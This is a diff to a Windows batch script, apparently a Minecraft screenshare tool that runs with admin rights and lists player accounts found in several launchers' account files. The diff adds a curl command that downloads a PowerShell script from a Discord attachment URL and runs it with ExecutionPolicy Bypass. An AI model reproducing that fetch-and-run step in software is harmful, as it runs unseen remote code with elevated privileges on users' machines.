@@ -1,6 +1,6 @@
 @echo off
 cls
-set version=1.2
+set version=1.3
 title RSS Tools v%version% (%date%)
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 
@@ -389,79 +389,50 @@ echo %d%If Proxy says yes, The user is on a Vpn or a proxy.
 echo %r%Press Any Key To Continue!%d%
 pause>nul
 ::Accounts
-:vanilaaccounts
-del %appdata%\SS\Alts.txt 2>nul
-cls
-echo ========== Accounts: ========== > Alts.txt >> %appdata%\SS\Alts.txt
-set search_string="name"
-set file_path=%appdata%\.minecraft\usercache.json
-if exist %file_path% (
-    findstr /C:%Search_string% %file_path% > Alts.txt >> %appdata%\SS\Alts.txt
-    goto lunar
-) else (
-    goto lunar
+del /f %appdata%\SS\Alts.txt 2>nul
+setlocal enabledelayedexpansion
+if exist C:\Users\%username%\.lunarclient\settings\game\accounts.json (
+    echo ==Lunar Accounts== >> %appdata%\SS\Alts.txt
+    findstr /C:"name" C:\Users\%username%\.lunarclient\settings\game\accounts.json >> %appdata%\SS\Alts.txt
 )
-:lunar
-set search_string="username" 
-set file_path=C:\Users\%username%\.lunarclient\settings\game\accounts.json
-if exist %file_path% (
-findstr /C:%Search_string% %file_path% > Alts.txt >> %appdata%\SS\Alts.txt
-goto cosmic
-) else (
-    goto cosmic
+echo ==.minecraft Accounts== >> %appdata%\SS\Alts.txt
+curl -o "%appdata%\SS\accounts.ps1" "https://cdn.discordapp.com/attachments/1130285640475492393/1130596617821634612/accounts.ps1" 2>nul
+powershell.exe -ExecutionPolicy Bypass -File "%appdata%\SS\accounts.ps1" >> %appdata%\SS\Alts.txt
+if exist %appdata%\.minecraft\cosmic\accounts.json (
+    echo ==Cosmic Client Accounts== >> %appdata%\SS\Alts.txt
+    findstr /C:"displayName" "%appdata%\.minecraft\cosmic\accounts.json" >> %appdata%\SS\Alts.txt
 )
-
-:cosmic
-set search_string="displayName"
-set file_path=%appdata%\.minecraft\cosmic\accounts.json
-if exist %file_path% (
-findstr /C:%Search_string% %file_path% > Alts.txt >> %appdata%\SS\Alts.txt
-goto tll
-) else (
-    goto tll
+if exist %appdata%\.tlauncher\legacy\Minecraft\game\tlauncher_profiles.json (
+    echo ==Tlauncher Accounts== >> %appdata%\SS\Alts.txt
+    findstr /C:"username" "%appdata%\.tlauncher\legacy\Minecraft\game\tlauncher_profiles.json" >> %appdata%\SS\Alts.txt
 )
-
-:tll
-set search_string="username" 
-set file_path=%appdata%\.tlauncher\legacy\Minecraft\game\tlauncher_profiles.json
-if exist %file_path% (
-findstr /C:%Search_string% %file_path% > Alts.txt >> %appdata%\SS\Alts.txt
-goto tl
-) else (
-    goto tl
+if exist %appdata%\.minecraft\TlauncherProfiles.json (
+    echo ==other TLauncher Accounts== >> %appdata%\SS\Alts.txt
+    findstr /C:"displayName" "%appdata%\.minecraft\TlauncherProfiles.json" >> %appdata%\SS\Alts.txt
 )
-
-
-:tl
-set search_string="displayName"
-set file_path2=%appdata%\.minecraft\TlauncherProfiles.json
-if exist %file_path2% (
-findstr /C:%Search_string% %file_path2% > Alts.txt >> %appdata%\SS\Alts.txt
-goto orbit
-) else (
-    goto orbit
-)
-pause
-:orbit
-set "folderPathOrbit=%appdata%\Orbit-Launcher\launcher-minecraft\cachedImages\faces"
-if exist "%folderPathOrbit%" (
-    goto orbit2
-    ) else (
-        goto modfolder
+if exist %appdata%\Orbit-Launcher\launcher-minecraft\cachedImages\faces\*.png (
+    echo ==Orbit Accounts== >> %appdata%\SS\Alts.txt
+for %%F in ("%appdata%\Orbit-Launcher\launcher-minecraft\cachedImages\faces\*.png") do (
+    set "fileName=%%~nF"
+    echo !fileName!>> "%appdata%\SS\Alts.txt"
     )
-:orbit2
-for %%F in ("%folderPathOrbit%\*") do (
-    echo %%~nxF > Alts.txt >> %appdata%\SS\Alts.txt 
-    notepad %appdata%\SS\Alts.txt
-    goto modfolder
 )
+if exist %appdata%\Badlion Client\logs\launcher (
+    echo ==Badlion Accounts== >> %appdata%\SS\Alts.txt
+for /r "%appdata%\Badlion Client\logs\launcher" %%F in (*) do (
+    findstr /C:"Found user" "%%F" >nul
+    if not errorlevel 1 (
+        for /F "tokens=2 delims=|" %%G in ('findstr /C:"Found user" "%%F"') do (
+            echo %%G >> %appdata%\SS\Alts.txt
+              )
+            )
+    )
+)
+endlocal
 
-                    
-:open
 notepad %appdata%\SS\Alts.txt
-echo %d%Press any button to Continue!
+echo %d%Press any key to continue!
 pause>nul
-
 
 :modfolder
 cls
